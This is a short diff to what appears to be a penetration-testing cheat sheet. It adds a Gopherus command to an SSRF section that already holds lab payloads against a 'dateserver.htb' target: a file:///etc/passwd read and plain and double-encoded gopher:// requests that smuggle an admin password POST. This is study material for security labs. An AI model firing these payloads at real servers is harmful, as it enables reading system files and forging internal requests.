@@ -909,6 +909,7 @@ $ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172
 dateserver=file:///etc/passwd&date=2024-01-01
 gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
 dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
+$ python2.7 gopherus.py --exploit smtp
 ```
 
 - Server-Side Template Injection (SSTI)
